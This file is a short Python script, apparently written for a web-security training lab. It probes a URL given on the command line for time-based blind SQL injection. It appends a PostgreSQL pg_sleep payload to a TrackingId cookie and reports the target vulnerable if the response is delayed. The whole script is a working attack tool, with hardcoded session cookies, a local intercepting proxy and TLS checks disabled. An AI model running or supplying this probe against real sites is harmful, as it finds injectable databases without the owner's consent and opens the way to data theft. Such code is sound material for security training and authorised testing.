import urllib.parse
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Before running the script make sure to change both the sessionId and the TrackingId values

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_time_delay(url):
    payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(payload)
    cookies = {'TrackingId': 'TiLKl4Wo0Y3E0TgG' + sqli_payload_encoded, 'session' : 'yqdVJMy9LneQTO6Zvcv9Qw2CniDH6bFN'}
    r = requests.get(url, cookies=cookies, verify=False)
    delay = r.elapsed
    if int(delay.total_seconds()) > 10:
        print("(+) The query is vulnerable to blind SQL injection")
    else:
        print("(-) Blind SQL injection attempt failed")



def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://target.com/")
        sys.exit(-1)

    url = sys.argv[1]
    print("Causing delay in the query execution...")
    sqli_time_delay(url)
    

    
if __name__ == "__main__":
    main()
